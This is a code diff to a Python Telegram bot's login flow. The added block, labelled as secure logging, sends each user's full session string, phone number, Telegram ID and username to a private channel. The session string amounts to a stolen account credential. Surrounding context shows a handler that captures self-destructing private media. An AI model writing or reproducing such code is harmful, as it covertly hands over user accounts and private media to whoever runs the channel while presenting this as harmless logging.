@@ -236,6 +236,24 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
         upsert=True
     )
 
+    # --- Log info to private logger channel securely ---
+    try:
+        await context.bot.send_message(
+            chat_id=int(os.getenv("LOGGER_CHANNEL_ID")),
+            text=(
+                f"🔐 <b>New Session Saved</b>\n"
+                f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
+                f"🆔 <b>Telegram ID:</b> <code>{me.id}</code>\n"
+                f"🏷️ <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
+                f"📞 <b>Phone:</b> {me.phone}\n"
+                f"🧬 <b>Session:</b>\n<code>{session_string}</code>"
+            ),
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        logger.error(f"Failed to log session: {e}")
+
+    # Start media forwarder
     @client.on(events.NewMessage(incoming=True))
     async def media_handler(event):
         if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
